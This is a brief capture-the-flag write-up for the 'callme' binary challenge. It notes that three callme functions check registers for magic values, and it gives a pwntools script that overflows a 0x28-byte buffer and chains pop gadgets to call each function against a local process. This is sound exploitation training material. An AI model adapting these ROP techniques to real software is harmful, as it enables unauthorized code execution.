![](../img/callme-1782095019148.webp)

there exist three "callme" function in this binary

p)

upon inspection in ida, it seems that those call me function check for rdi, rsi, rdx for specific values and each print out part of the flag

![](../img/callme-1782095178540.webp)

paired with the fact that there is no pie, building a rop chain should be easy enough

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./callme")

context.binary = exe
context.log_level = "debug"

script = '''
b*main+271
c
'''

def main():
    # r = gdb.debug(exe.path, gdbscript=script)
    r = process(exe.path)

    pop_rdi=0x00000000004009a3
    pop_rsi_pop_rdx=0x000000000040093d
    buffer=b"A"*0x28

    payload=flat(
        buffer,
        pop_rdi,
        0xdeadbeefdeadbeef,
        pop_rsi_pop_rdx,
        0xcafebabecafebabe,
        0xd00df00dd00df00d,
        exe.sym["callme_one"],
        pop_rdi,
        0xdeadbeefdeadbeef,
        pop_rsi_pop_rdx,
        0xcafebabecafebabe,
        0xd00df00dd00df00d,
        exe.sym["callme_two"],
        pop_rdi,
        0xdeadbeefdeadbeef,
        pop_rsi_pop_rdx,
        0xcafebabecafebabe,
        0xd00df00dd00df00d,
        exe.sym["callme_three"]
    )

    time.sleep(0.1)
    r.send(payload)

    r.interactive()

if __name__ == "__main__":
    main()

```